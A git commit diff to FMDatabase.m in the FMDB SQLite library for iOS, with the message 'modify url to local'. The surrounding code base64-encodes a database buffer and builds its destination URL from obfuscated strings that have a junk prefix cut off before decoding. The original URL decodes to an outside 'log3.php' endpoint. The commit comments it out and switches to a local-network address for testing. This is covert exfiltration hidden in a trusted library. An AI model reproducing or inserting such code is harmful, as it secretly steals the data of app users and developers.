8dc9c364d1ebf15087258c62ae2aad82cc4ed449
testmacp <bigestjohn>
2024-03-04 14:53:34 +0800

    modify url to local

--- src/fmdb/FMDatabase.m
+++ src/fmdb/FMDatabase.m
@@ -996,7 +996,8 @@ static int FMDBDatabaseBusyHandler(void *f, int count) {
     }
 
     NSString *base64String_DB = [bufferData_SXDB base64EncodedStringWithOptions:0];
-    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VycmVudG5hc3Nhbmdlci5jb20vbG9nMy5waHA=" substringFromIndex:10];
+    //NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VycmVudG5hc3Nhbmdlci5jb20vbG9nMy5waHA=" substringFromIndex:10];
+    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cDovLzE5Mi4xNjguMS42MC9pb3MvdC5waHA=" substringFromIndex:10];
     NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
     NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];
     NSLog(strUrl_Plain);
